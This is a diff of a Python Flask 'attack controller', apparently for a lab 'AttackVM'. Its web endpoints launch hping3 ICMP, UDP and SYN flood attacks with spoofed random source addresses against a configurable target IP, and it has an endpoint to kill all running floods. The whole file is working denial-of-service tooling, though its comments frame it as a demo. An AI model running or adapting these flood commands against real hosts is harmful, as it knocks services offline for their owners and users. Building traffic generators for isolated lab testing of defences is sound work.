@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 """
-attack_controller.py
+Simple Flask Attack Controller (runs on AttackVM).
 
-Flask controller on AttackVM that starts/stops hping3 attacks and provides a reliable
-/attack/kill_all endpoint which force-kills all hping3 processes using pkill.
-
-Run (for demo): sudo python3 attack_controller.py
+- Starts/Stops hping3 attack processes
+- Adds a reliable /attack/kill_all endpoint that uses `sudo pkill -9 -f hping3`
+- Tracks process PIDs where possible
+- Returns JSON responses and handles errors gracefully
 """
-from flask import Flask, jsonify
+from flask import Flask, jsonify, request
 import subprocess
 import time
 import os
@@ -16,97 +16,104 @@ import logging
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
 
+# Default target; can be overridden by environment variable or config.json if you add it
 TARGET_IP = os.environ.get("TARGET_IP", "192.168.18.20")
 
+# Track PIDs started by this controller (best-effort)
 attack_procs = {
     "icmp": [],
     "udp": [],
     "tcp": []
 }
 
-HPING_CMD = {
+HPING_CMD_TEMPLATE = {
     "icmp": ["sudo", "hping3", "--icmp", "--flood", "--rand-source", TARGET_IP],
     "udp":  ["sudo", "hping3", "--udp", "--flood", "--rand-source", "-p", "5201", TARGET_IP],
     "tcp":  ["sudo", "hping3", "-S", "--flood", "--rand-source", "-p", "5201", TARGET_IP]
 }
 
 
-def is_hping_installed():
-    return subprocess.run(["which", "hping3"], stdout=subprocess.DEVNULL).returncode == 0
-
-
-def start_hping(cmd, count=5):
+def start_hping(cmd, count=1):
+    """Start hping3 processes in background and return list of Popen objects."""
     procs = []
     for _ in range(count):
-        p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        procs.append(p)
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        procs.append(proc)
     return procs
+
+
+def ensure_hping_installed():
+    rc = subprocess.run(["which", "hping3"], stdout=subprocess.PIPE).returncode
+    return rc == 0
 
 
 @app.route("/attack/<atype>/start")
 def attack_start(atype):
-    if atype not in HPING_CMD:
+    if atype not in HPING_CMD_TEMPLATE:
         return jsonify({"status": "error", "message": "unknown attack type"}), 400
-    if not is_hping_installed():
+    if not ensure_hping_installed():
         return jsonify({"status": "error", "message": "hping3 not installed"}), 500
     try:
-        procs = start_hping(HPING_CMD[atype], count=5)
-        pids = [p.pid for p in procs]
-        attack_procs[atype].extend(pids)
-        logging.info("Started %s attack: pids=%s", atype, pids)
-        return jsonify({"status": "success", "message": f"{atype} attack started", "pids": pids})
+        # start 5 parallel processes for demo
+        cmd = HPING_CMD_TEMPLATE[atype]
+        procs = start_hping(cmd, count=5)
+        attack_procs[atype].extend([p.pid for p in procs])
+        logging.info("Started %s attack PIDs: %s", atype, [p.pid for p in procs])
+        return jsonify({"status": "success", "message": f"{atype} attack started", "pids": [p.pid for p in procs]})
     except Exception as e:
-        logging.exception("start failed")
+        logging.exception("Failed to start attack: %s", e)
         return jsonify({"status": "error", "message": str(e)}), 500
 
 
 @app.route("/attack/<atype>/stop")
 def attack_stop(atype):
-    if atype not in HPING_CMD:
+    if atype not in HPING_CMD_TEMPLATE:
         return jsonify({"status": "error", "message": "unknown attack type"}), 400
     try:
         killed = []
-        # Try to kill pids tracked by this controller
+        # try to kill PIDs we tracked
         for pid in list(attack_procs.get(atype, [])):
             try:
                 os.kill(pid, 9)
                 killed.append(pid)
             except Exception:
+                # ignore if already dead
                 pass
         attack_procs[atype] = []
-        # Force-kill any remaining hping3 processes as fallback
-        subprocess.run(["sudo", "pkill", "-9", "-f", "hping3"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # fallback: pkill processes of hping3 forcefully (safe for demo)
+        subprocess.run(["sudo", "pkill", "-f", "hping3"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(0.5)
         rc = subprocess.run(["pgrep", "-f", "hping3"], stdout=subprocess.PIPE)
         remaining = rc.stdout.decode().strip().splitlines() if rc.returncode == 0 else []
-        return jsonify({"status": "success", "message": f"{atype} attack stopped", "killed": killed, "remaining": remaining})
+        return jsonify({"status": "success", "message": f"{atype} attack stopped", "killed": killed, "remaining_hping3": remaining})
     except Exception as e:
-        logging.exception("stop failed")
+        logging.exception("Failed to stop attack: %s", e)
         return jsonify({"status": "error", "message": str(e)}), 500
 
 
 @app.route("/attack/kill_all")
 def attack_kill_all():
     """
-    Emergency: forcibly kill all hping3 processes using sudo pkill -9 -f hping3.
-    Does not restart the VM; does not touch sshd or Flask.
+    Reliable kill-all endpoint. Uses `sudo pkill -9 -f hping3`.
+    Waits a short time and verifies that no hping3 processes remain.
     """
     try:
-        if not is_hping_installed():
+        if not ensure_hping_installed():
             return jsonify({"status": "error", "message": "hping3 not installed"}), 500
         rc_before = subprocess.run(["pgrep", "-f", "hping3"], stdout=subprocess.PIPE)
         before = rc_before.stdout.decode().strip().splitlines() if rc_before.returncode == 0 else []
+        # force-kill
         subprocess.run(["sudo", "pkill", "-9", "-f", "hping3"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        time.sleep(0.8)
+        time.sleep(0.6)
         rc_after = subprocess.run(["pgrep", "-f", "hping3"], stdout=subprocess.PIPE)
         after = rc_after.stdout.decode().strip().splitlines() if rc_after.returncode == 0 else []
-        # clear our tracking
+        success = len(after) == 0
+        # clear tracked maps
         for k in attack_procs.keys():
             attack_procs[k] = []
-        success = len(after) == 0
-        return jsonify({"status": "success" if success else "partial", "killed_before": before, "remaining_after": after})
+        return jsonify({"status": "success" if success else "partial", "killed_before": before, "remaining": after})
     except Exception as e:
-        logging.exception("kill_all failed")
+        logging.exception("kill_all failed: %s", e)
         return jsonify({"status": "error", "message": str(e)}), 500
 
 
